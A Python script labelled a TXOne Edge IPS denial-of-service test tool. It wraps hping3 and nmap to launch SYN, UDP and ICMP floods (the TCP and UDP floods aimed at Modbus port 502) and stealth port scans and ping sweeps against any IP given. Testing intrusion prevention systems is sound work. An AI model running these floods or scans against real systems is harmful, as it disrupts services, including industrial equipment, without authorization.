#!/usr/bin/env python3

import argparse
import subprocess
import sys

def run_attack(attack_type, target_ip, duration):
    print(f"[+] Running attack: {attack_type} on {target_ip} for {duration} seconds...")

    try:
        if attack_type == "syn-flood":
            cmd = ["hping3", "-S", target_ip, "-p", "502", "--flood"]
        elif attack_type == "udp-flood":
            cmd = ["hping3", "--udp", "-p", "502", "--flood", target_ip]
        elif attack_type == "icmp-flood":
            cmd = ["hping3", "--icmp", "--flood", target_ip]
        elif attack_type == "tcp-scan-syn":
            cmd = ["nmap", "-sS", "-p-", target_ip]
        elif attack_type == "tcp-scan-null":
            cmd = ["nmap", "-sN", target_ip]
        elif attack_type == "tcp-scan-xmas":
            cmd = ["nmap", "-sX", target_ip]
        elif attack_type == "ping-sweep":
            cmd = ["nmap", "-sn", target_ip + "/24"]
        else:
            print(f"[!] Unsupported attack type: {attack_type}")
            sys.exit(1)

        print(f"[+] Running command: {' '.join(cmd)}")
        proc = subprocess.Popen(cmd)

        proc.wait(timeout=int(duration))
        proc.terminate()

    except subprocess.TimeoutExpired:
        print("[*] Attack duration complete. Terminating process.")
        proc.terminate()
    except KeyboardInterrupt:
        print("[!] Attack interrupted by user.")
        proc.terminate()
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(
        description="TXOne Edge IPS DoS Test Script",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument("attack_type", 
                        help="Type of DoS attack. Available options: "
                             "syn-flood, udp-flood, icmp-flood, "
                             "tcp-scan-syn, tcp-scan-null, "
                             "tcp-scan-xmas, ping-sweep")
    parser.add_argument("target_ip", help="Target IP address")
    parser.add_argument("duration", help="Duration to run the attack (in seconds)")
    
    # Show options if user runs -h or --help
    args = parser.parse_args()

    run_attack(args.attack_type, args.target_ip, args.duration)
